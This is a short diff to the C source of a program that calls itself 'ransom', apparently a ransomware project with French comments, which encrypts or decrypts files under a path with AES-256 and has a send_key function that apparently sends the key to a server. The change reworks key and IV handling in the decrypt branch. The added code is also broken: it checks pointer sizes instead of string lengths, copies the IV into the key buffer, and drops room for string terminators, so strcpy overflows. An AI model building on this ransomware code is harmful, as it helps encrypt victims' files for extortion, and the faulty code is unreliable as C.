@@ -96,6 +96,13 @@ int send_key(char *pKey, char *pIv, char * serveraddress )
 
 int main(int argc, char *argv[])
 {
+	// Clé & IV au format binaire
+	unsigned char key[AES_256_KEY_SIZE];
+	unsigned char iv[AES_BLOCK_SIZE];
+	// Clé & IV au format hexadécimal (moitié de l'espace nécessaire)
+	char pKey[AES_256_KEY_SIZE/2];
+	char pIv[AES_BLOCK_SIZE/2];
+
 	if (argc > 1)
 	{
 		// Arguments: ransom [-d|-e] <key> <iv> chemin
@@ -117,11 +124,22 @@ int main(int argc, char *argv[])
 				printf("Correct syntax: ransom -d key iv path\n");
 				return 0;
 			}
-
 			char de_flag = 'd';
-			char *key = argv[2];
-			char *iv = argv[3];
-			char *path = argv[4];
+
+			if (sizeof(argv[2]) == AES_256_KEY_SIZE/2){
+				strcpy(pKey, argv[2]);
+			} else {
+				printf("Wrong key format");
+				return 0;
+			}
+			
+			if (sizeof(argv[3]) == AES_BLOCK_SIZE/2){
+				strcpy(pKey, argv[3]);
+			} else {
+				printf("Wrong key format");
+				return 0;
+			}
+
 		}
 		else
 		{ // Si ni -e ni -d -> Erreur
@@ -130,14 +148,6 @@ int main(int argc, char *argv[])
 	} else {
 		printf("You must specify -d or -e\n");
 	}
-
-	// Clé & IV au format binaire
-	unsigned char key[AES_256_KEY_SIZE];
-	unsigned char iv[AES_BLOCK_SIZE];
-	// Clé & IV au format hexadécimal (moitié de l'espace nécessaire)
-	char pKey[AES_256_KEY_SIZE/2 +1];
-	char pIv[AES_BLOCK_SIZE/2 +1];
-
 
 	generate_key(key, sizeof(key), iv, sizeof(iv), pKey, pIv);
 	
